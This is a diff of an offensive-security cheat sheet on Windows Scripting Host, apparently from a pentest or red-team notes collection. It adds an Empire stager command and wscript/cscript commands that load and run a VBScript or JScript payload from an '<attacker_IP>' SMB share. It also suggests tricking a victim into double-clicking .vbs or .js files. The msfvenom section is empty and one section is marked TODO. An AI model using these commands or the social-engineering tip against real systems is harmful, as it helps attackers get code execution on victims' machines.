@@ -1,19 +1,40 @@
 # Windows Scripting Host
 
-## VBScript
+## 01 - Generate Payloads
+
+### 1.1 - `msfvenom`
+
+```
+
+```
+
+### 1.2 - Empire
+
+TODO: Fill this info
+
+```
+(Empire) > usestager windows/launcher_vbs
+```
+
+## 02 - Execute Payloads
+
+> [!TIP] Windows Scripting Host Payloads
+> You can actually social engineer the victim to double click the `.vbs` or `.js` to establish connection.
+
+### 2.1 - VBScript
 
 ```
 C:\> wscript.exe <script.js | script.vbs>
 
-C:\> wscript.exe //E:vbscript \\<attacker_IP>\path\to\implant.vbs
+C:\> wscript.exe //E:vbscript \\<attacker_IP>\path\to\payload.vbs
 ```
 
-## JScript Dialect
+### 2.2 - JScript
 
 ```
 C:\> cscript.exe <script.js | script.vbs | script.cs>
 
-C:\> cscript.exe //E:jscript \\<attacker_IP>\path\to\implant.vbs
+C:\> cscript.exe //E:jscript \\<attacker_IP>\path\to\payload.vbs
 ```
 
 ---
